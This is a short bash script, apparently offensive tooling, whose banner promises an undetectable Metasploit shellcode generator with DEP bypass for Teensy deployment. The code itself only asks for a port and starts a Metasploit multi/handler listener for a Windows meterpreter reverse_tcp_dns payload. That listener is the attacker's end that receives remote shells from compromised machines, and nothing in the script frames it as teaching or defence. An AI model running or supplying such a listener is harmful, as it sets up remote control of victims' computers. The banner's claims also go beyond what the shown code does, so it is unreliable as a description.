#!/bin/bash
clear
echo "***************************************************************"
echo "       Automatic  shellcode generator - FOR METASPLOIT         "
echo "       DEP-Bypass  By Astr0baby 2011  Merry X-Mas  FUD         " 
echo "       For Automatic Teensy programming and deployment         "
echo "***************************************************************"
echo -e "What Port Number are we gonna listen to? : \c"
read port
echo "      starting the meterpreter listener.."
./msfcli exploit/multi/handler  PAYLOAD=windows/meterpreter/reverse_tcp_dns LHOST=127.0.0.1 LPORT=$port  E 
